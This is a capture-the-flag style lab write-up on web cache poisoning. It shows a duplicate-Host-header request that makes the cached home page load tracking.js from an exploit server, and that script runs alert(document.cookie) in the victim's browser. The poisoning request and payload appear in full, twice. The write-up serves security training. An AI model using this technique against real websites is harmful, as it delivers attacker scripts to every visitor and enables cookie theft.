## Web cache poisoning via ambiguous requests

This lab is vulnerable to web cache poisoning due to discrepancies in how the cache and the back-end application handle ambiguous requests. An unsuspecting user regularly visits the site's home page.

To solve the lab, poison the cache so the home page executes alert(document.cookie) in the victim's browser.

## Notes

- /login
- /resources/js/tracking.js

## Solve

The homepage imports:

```html
<script type="text/javascript" src="//0af1009904b1940e80ca1c7c006d0025.h1-web-security-academy.net/resources/js/tracking.js"></script>
```

The application validates the first `Host` header:

```http
Host: 0af1009904b1940e80ca1c7c006d0025.h1-web-security-academy.net
```

but reflects the second one inside the generated script URL.

Poisoning request:

```http
GET /?cb=abc HTTP/1.1
Host: 0af1009904b1940e80ca1c7c006d0025.h1-web-security-academy.net
Host: exploit-0a5a00ba0412948780b71b76013a003f.exploit-server.net
```

The backend response becomes:

```html
<script type="text/javascript" src="//exploit-0a5a00ba0412948780b71b76013a003f.exploit-server.net/resources/js/tracking.js"></script>
```

Even though routing still works because the first `Host` header is trusted.

The cache stores this poisoned response.

On the exploit server, create:

```javascript
/resources/js/tracking.js
```

with:

```javascript
alert(document.cookie)
```

Keep replaying the poisoning request until receiving a cache hit.

The response headers reveal cache status:

```http
X-Cache: hit
```

Then visit:

```text
https://0af1009904b1940e80ca1c7c006d0025.h1-web-security-academy.net/?cb=abc
```

The victim browser loads:

```html
<script src="//exploit-0a5a00ba0412948780b71b76013a003f.exploit-server.net/resources/js/tracking.js"></script>
```

which executes:

```javascript
alert(document.cookie)
```

resulting in successful cache poisoning and XSS.

## Malicious tracking.js

```javascript
alert(document.cookie)
```

## Poisoning request

```http
GET /?cb=abc HTTP/1.1
Host: 0af1009904b1940e80ca1c7c006d0025.h1-web-security-academy.net
Host: exploit-0a5a00ba0412948780b71b76013a003f.exploit-server.net
```